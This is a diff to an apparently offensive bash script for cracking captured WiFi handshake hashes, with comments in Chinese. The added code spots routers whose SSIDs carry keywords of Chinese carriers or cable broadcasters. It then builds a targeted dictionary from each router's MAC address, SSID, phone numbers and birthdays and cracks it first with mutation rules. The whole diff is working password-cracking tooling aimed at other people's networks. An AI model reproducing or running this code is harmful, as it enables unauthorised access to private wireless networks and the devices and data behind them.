@@ -459,6 +459,64 @@ echo "  开始攻击 (${AP_COUNT} 个AP)"
 echo "============================================"
 START_TIME=$(date +%s)
 
+# ============================================================================
+# ISP/广电/运营商 SSID 自动检测
+# 匹配规则: SSID中包含以下关键词视为运营商定制设备
+#   广电: sxbctvnet, catv, gdwl, guangdian, sxbc, sxgd
+#   移动: cmcc, chinamobile
+#   电信: chinanet, telecom, ctnet
+#   联通: chinaunicom, unicom, cunet
+# 检测到后自动生成定向字典并在阶段0之前优先攻击
+# ============================================================================
+ISP_DETECTED=0
+ISP_TYPE=""
+ISP_DICT="${DICT_DIR}/isp-catv-targeted.txt"
+
+# 从hash文件提取所有SSID, 逐个检测是否为ISP定制设备
+while IFS='|' read bssid_hex ssid_hex; do
+    ssid_decoded=$(echo "$ssid_hex" | xxd -r -p 2>/dev/null || echo "$ssid_hex")
+    ssid_lower=$(echo "$ssid_decoded" | tr '[:upper:]' '[:lower:]')
+    bssid_fmt=$(echo "$bssid_hex" | sed 's/\(..\)/\1:/g; s/:$//' | tr '[:lower:]' '[:upper:]')
+
+    case "$ssid_lower" in
+        *sxbctvnet*|*sxbc*|*sxgd*|*catv*|*gdwl*|*guangdian*)
+            ISP_DETECTED=1; ISP_TYPE="广电" ;;
+        *cmcc*|*chinamobile*|*yidong*)
+            ISP_DETECTED=1; ISP_TYPE="移动" ;;
+        *chinanet*|*telecom*|*ctnet*|*dianxin*)
+            ISP_DETECTED=1; ISP_TYPE="电信" ;;
+        *chinaunicom*|*unicom*|*cunet*|*liantong*)
+            ISP_DETECTED=1; ISP_TYPE="联通" ;;
+    esac
+
+    if [ "$ISP_DETECTED" -eq 1 ]; then
+        echo ""
+        echo "  ★ 检测到${ISP_TYPE}运营商设备: ${ssid_decoded} (${bssid_fmt})"
+        # 如果字典生成脚本存在, 自动针对该BSSID/SSID重新生成
+        GEN_SCRIPT="${SCRIPT_DIR}/gen_isp_dict.py"
+        if [ -f "$GEN_SCRIPT" ] && command -v python3 &>/dev/null; then
+            echo "  ★ 自动生成${ISP_TYPE}专用字典 (BSSID: ${bssid_fmt}, SSID: ${ssid_decoded})"
+            python3 "$GEN_SCRIPT" --bssid "$bssid_fmt" --ssid "$ssid_decoded" --output "$ISP_DICT" 2>&1 | sed 's/^/    /'
+        fi
+        break
+    fi
+done < <(awk -F'*' '{print $4"|"$6}' "${HASHES}" | sort -u)
+
+# ──────────────────────────────────────
+# 阶段0-PRE: ISP/广电专用字典 (仅运营商设备触发)
+# 优先级最高, 在所有通用攻击之前执行
+# ──────────────────────────────────────
+if [ "$ISP_DETECTED" -eq 1 ] && [ -f "$ISP_DICT" ]; then
+    echo ""
+    echo ">>>>>> 阶段0-PRE: ${ISP_TYPE}运营商专用字典 (优先) <<<<<<"
+    ISP_LINES=$(wc -l < "$ISP_DICT" | tr -d ' ')
+    echo "  字典: $(basename "$ISP_DICT") (${ISP_LINES} 条)"
+    run_dict "${ISP_TYPE}专用字典(MAC+SSID+手机号+生日)" "$ISP_DICT"
+    # ISP字典 + 中国规则变换 (覆盖大小写/数字追加等变体)
+    [ -f "${RULE_CHINA}" ] && run_dict_rule "${ISP_TYPE}专用+中国规则" "$ISP_DICT" "${RULE_CHINA}"
+    [ -n "${RULE_BEST64}" ] && run_dict_rule "${ISP_TYPE}专用+best64" "$ISP_DICT" "${RULE_BEST64}"
+fi
+
 # ──────────────────────────────────────
 # 阶段0: SSID定向 + 精华字典 (秒级)
 # ──────────────────────────────────────
